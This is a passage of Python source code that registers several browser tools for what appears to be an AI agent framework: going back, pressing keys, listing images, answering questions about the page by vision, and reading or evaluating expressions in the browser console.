    check_fn=check_browser_requirements,
    emoji="📜",
)
registry.register(
    name="browser_back",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_back"],
    handler=lambda args, **kw: browser_back(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="◀️",
)
registry.register(
    name="browser_press",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_press"],
    handler=lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)

registry.register(
    name="browser_get_images",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_get_images"],
    handler=lambda args, **kw: browser_get_images(task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖼️",
)
registry.register(
    name="browser_vision",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_vision"],
    handler=lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id")),
    check_fn=check_browser_vision_requirements,
    emoji="👁️",
)
registry.register(
    name="browser_console",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_console"],
    handler=lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🖥️",
)
